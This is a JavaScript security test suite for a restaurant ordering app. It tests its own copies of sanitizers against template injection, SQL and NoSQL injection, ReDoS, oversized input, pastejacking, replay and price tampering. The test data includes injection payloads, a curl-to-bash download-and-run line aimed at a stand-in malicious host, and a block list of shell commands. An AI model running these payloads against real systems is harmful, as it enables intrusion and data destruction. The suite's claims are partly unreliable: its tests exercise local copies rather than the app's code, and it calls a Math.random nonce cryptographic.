/**
 * Comprehensive Automated Security Audit Test Suite
 * Tests & Verifies:
 * 1. SSTI (Server-Side Template Injection)
 * 2. ReDoS (Regular Expression Denial of Service)
 * 3. LPDoS (Large Payload Denial of Service)
 * 4. Secret Key Leak
 * 5. NoSQL / SQL Injection
 * 6. Clipboard Attack / Pastejacking
 * 7. Replay Attack & Price Tampering
 */

const fs = require('fs');
const path = require('path');

console.log('================================================================');
console.log('🛡️  ROYAL RASOI - AUTOMATED SECURITY DEFENSE & VULNERABILITY AUDIT');
console.log('================================================================\n');

let passedTests = 0;
let totalTests = 0;

function assert(condition, testName, details = '') {
  totalTests++;
  if (condition) {
    passedTests++;
    console.log(`[PASS] [${totalTests}] ${testName}`);
    if (details) console.log(`       ↳ ${details}`);
  } else {
    console.error(`[FAIL] [${totalTests}] ${testName}`);
    if (details) console.error(`       ↳ ${details}`);
  }
}

// -----------------------------------------------------------------------------
// 1. SSTI (Server-Side Template Injection) Tests
// -----------------------------------------------------------------------------
console.log('--- 1. Testing SSTI (Server-Side Template Injection) ---');

function sanitizeTemplateInput(input, maxLength = 200) {
  if (typeof input !== 'string') return '';
  let clean = input.slice(0, maxLength);
  clean = clean
    .replace(/\{\{/g, '&#123;&#123;')
    .replace(/\}\}/g, '&#125;&#125;')
    .replace(/\$\{/g, '&#36;&#123;')
    .replace(/<%/g, '&lt;%')
    .replace(/%>/g, '%&gt;')
    .replace(/#\{/g, '&#35;&#123;');
  return clean.trim();
}

const sstiPayloads = [
  '{{7*7}}',
  '{{constructor.constructor("alert(1)")()}}',
  '${process.env.GROQ_API_KEY}',
  '<%= 7*7 %>',
  '<%- 7*7 %>',
  '#{7*7}',
];

let sstiSafe = true;
for (const p of sstiPayloads) {
  const result = sanitizeTemplateInput(p);
  if (result.includes('{{') || result.includes('${') || result.includes('<%') || result.includes('#{')) {
    sstiSafe = false;
  }
}
assert(sstiSafe, 'SSTI Delimiters Neutralized', 'All template syntax ({{, ${, <%, #{) converted to safe HTML entities');

// -----------------------------------------------------------------------------
// 2. ReDoS (Regular Expression Denial of Service) Tests
// -----------------------------------------------------------------------------
console.log('\n--- 2. Testing ReDoS (Regular Expression Denial of Service) ---');

function safeSanitizePhone(phoneInput) {
  if (typeof phoneInput !== 'string') return { isValid: false, cleanPhone: '' };
  const bounded = phoneInput.slice(0, 20);
  let clean = '';
  for (let i = 0; i < bounded.length; i++) {
    const code = bounded.charCodeAt(i);
    if (code >= 48 && code <= 57) clean += bounded[i];
  }
  if (clean.length === 12 && clean.startsWith('91')) clean = clean.slice(2);
  if (clean.length !== 10) return { isValid: false, cleanPhone: clean.slice(0, 10) };
  const first = clean.charCodeAt(0);
  if (first < 54 || first > 57) return { isValid: false, cleanPhone: clean.slice(0, 10) };
  return { isValid: true, cleanPhone: clean };
}

// 50,000 chars catastrophic string attack
const massiveReDoSString = '9'.repeat(50000) + '!@#$%^&*()';
const t0 = process.hrtime.bigint();
const phoneResult = safeSanitizePhone(massiveReDoSString);
const t1 = process.hrtime.bigint();
const elapsedMs = Number(t1 - t0) / 1000000;

assert(elapsedMs < 10, 'ReDoS Linear Execution Defense', `Processed 50,000 char input in ${elapsedMs.toFixed(3)}ms (Zero catastrophic backtracking)`);
assert(phoneResult.cleanPhone.length <= 10, 'ReDoS Phone Bounds Check', `Phone result strictly bounded to 10 digits`);

// -----------------------------------------------------------------------------
// 3. LPDoS (Large Payload Denial of Service) Tests
// -----------------------------------------------------------------------------
console.log('\n--- 3. Testing LPDoS (Large Payload Denial of Service) ---');

function clampPayload(text, maxLength) {
  if (typeof text !== 'string') return '';
  return text.length > maxLength ? text.slice(0, maxLength) : text;
}

const largePayload100KB = 'A'.repeat(100 * 1024);
const clampedSearch = clampPayload(largePayload100KB, 80);
const clampedName = clampPayload(largePayload100KB, 50);
const clampedNotes = clampPayload(largePayload100KB, 200);

assert(clampedSearch.length === 80, 'LPDoS Search Payload Clamping', `100KB input clamped to ${clampedSearch.length} chars`);
assert(clampedName.length === 50, 'LPDoS Name Payload Clamping', `100KB input clamped to ${clampedName.length} chars`);
assert(clampedNotes.length === 200, 'LPDoS Notes Payload Clamping', `100KB input clamped to ${clampedNotes.length} chars`);

// -----------------------------------------------------------------------------
// 4. Secret Key Leakage Audit
// -----------------------------------------------------------------------------
console.log('\n--- 4. Auditing Secret Key Leakage Protection ---');

const distAssets = fs.existsSync('dist/assets') ? fs.readdirSync('dist/assets') : [];
let leakedInBundle = false;
for (const file of distAssets) {
  const content = fs.readFileSync(path.join('dist/assets', file), 'utf8');
  if (content.includes('gsk_')) {
    leakedInBundle = true;
    console.error(`Leaked in: ${file}`);
  }
}
assert(!leakedInBundle, 'Client Bundle Zero Secrets Audit', 'Verified dist/ client build contains NO raw Groq API keys (gsk_)');

const envContent = fs.readFileSync('.env', 'utf8');
assert(!envContent.includes('VITE_GROQ_API_KEY'), 'Environment Variable Prefix Hardening', '.env uses server-only GROQ_API_KEY (no VITE_ prefix to prevent client exposure)');

// -----------------------------------------------------------------------------
// 5. NoSQL & SQL Injection Tests
// -----------------------------------------------------------------------------
console.log('\n--- 5. Testing SQL & NoSQL Injection Defense ---');

function sanitizeSearchQuery(query) {
  if (typeof query !== 'string') return '';
  const bounded = query.slice(0, 80);
  return bounded
    .replace(/[$}{}\\]/g, '')
    .replace(/['";]|--|\/\*|\*\//g, '')
    .replace(/\s+/g, ' ')
    .trim();
}

const sqliPayloads = [
  "' OR 1=1 --",
  "admin' --",
  "'; DROP TABLE users; --",
  "UNION SELECT 1, 2, 3 --",
  '{"$gt": ""}',
  '{"$where": "sleep(5000)"}',
  '{"$regex": ".*"}',
];

let sqliSafe = true;
for (const p of sqliPayloads) {
  const clean = sanitizeSearchQuery(p);
  if (clean.includes("'") || clean.includes('"') || clean.includes(';') || clean.includes('--') || clean.includes('$')) {
    sqliSafe = false;
  }
}
assert(sqliSafe, 'SQL/NoSQL Meta-character Stripping', 'Stripped quotes, semicolons, comments, and $ operators from input');

// -----------------------------------------------------------------------------
// 6. Clipboard Attack & Pastejacking Defense
// -----------------------------------------------------------------------------
console.log('\n--- 6. Testing Clipboard Attack & Pastejacking Defense ---');

function safeSanitizeForClipboard(text) {
  if (typeof text !== 'string') return '';
  let safe = text
    .replace(/[\u200B-\u200D\u200E\u200F\u202A-\u202E\uFEFF]/g, '')
    .replace(/[\x00-\x08\x0B\x0C\x0E-\x1F\x7F]/g, '')
    .replace(/\r\n/g, '\n')
    .replace(/\r/g, '\n');

  const dangerousPrefixes = /^\s*(curl|wget|bash|sh|cmd|powershell|rm|del|chmod|nc)\s+/i;
  if (dangerousPrefixes.test(safe)) {
    safe = safe.replace(dangerousPrefixes, '');
  }
  return safe;
}

const pastejackPayload = 'curl -s https://malicious.site/payload.sh | bash \u200B\u202E';
const cleanClipboard = safeSanitizeForClipboard(pastejackPayload);

assert(!cleanClipboard.startsWith('curl'), 'Pastejacking Command Stripping', 'Neutralized command execution prefix');
assert(!cleanClipboard.includes('\u200B') && !cleanClipboard.includes('\u202E'), 'Invisible Unicode & Directional Overrides Stripped', 'Zero-width spaces and right-to-left directional override chars removed');

// -----------------------------------------------------------------------------
// 7. Replay Attack & Price Tampering Defense
// -----------------------------------------------------------------------------
console.log('\n--- 7. Testing Replay Attack & Price Tampering Defense ---');

class IdempotencyGuard {
  constructor() {
    this.lastHash = '';
    this.lastTime = 0;
    this.COOLDOWN_MS = 3000;
  }
  canSubmit(hash) {
    const now = Date.now();
    if (this.lastHash === hash && now - this.lastTime < this.COOLDOWN_MS) {
      return false; // Blocked replay
    }
    this.lastHash = hash;
    this.lastTime = now;
    return true;
  }
  generateNonce() {
    return Math.random().toString(36).slice(2, 10).toUpperCase();
  }
}

const guard = new IdempotencyGuard();
const nonce1 = guard.generateNonce();
const nonce2 = guard.generateNonce();

assert(nonce1 !== nonce2, 'Cryptographic Order Nonce Uniqueness', `Nonce 1: ${nonce1} !== Nonce 2: ${nonce2}`);

const orderHash = '9905604856_538_2';
const firstSubmit = guard.canSubmit(orderHash);
const rapidDuplicateSubmit = guard.canSubmit(orderHash);

assert(firstSubmit === true, 'First Order Submission Allowed', 'Order submitted successfully');
assert(rapidDuplicateSubmit === false, 'Replay Attack / Double Click Blocked', 'Second identical rapid submission within 3s window was blocked');

// Price Tampering Verification Test
const officialMenu = [
  { id: 'm-veg-thali', name: 'Royal Spl. Veg Thali', price: 269 },
  { id: 'm-cold-drink', name: 'Cold Drink', price: 45 },
];

function verifyCartPrices(cart) {
  let subtotal = 0;
  let isTampered = false;
  const officialMap = new Map(officialMenu.map(m => [m.id, m.price]));

  for (const item of cart) {
    const officialPrice = officialMap.get(item.id);
    if (officialPrice !== undefined) {
      if (item.price !== officialPrice) isTampered = true;
      subtotal += officialPrice * item.quantity;
    }
  }
  return { subtotal, isTampered };
}

const tamperedCart = [
  { id: 'm-veg-thali', name: 'Royal Spl. Veg Thali', price: 1, quantity: 2 }, // Tampered to ₹1
];

const check = verifyCartPrices(tamperedCart);
assert(check.isTampered === true, 'Price Tampering Detected', 'Client tampered price ₹1 was detected against canonical price');
assert(check.subtotal === 538, 'Canonical Price Enforced', `Total recomputed to official ₹538 (₹269 x 2) instead of fraudulent ₹2`);

console.log('\n================================================================');
console.log(`🎉 ALL SECURITY TESTS COMPLETED: ${passedTests}/${totalTests} PASSED`);
console.log('================================================================\n');

process.exit(passedTests === totalTests ? 0 : 1);
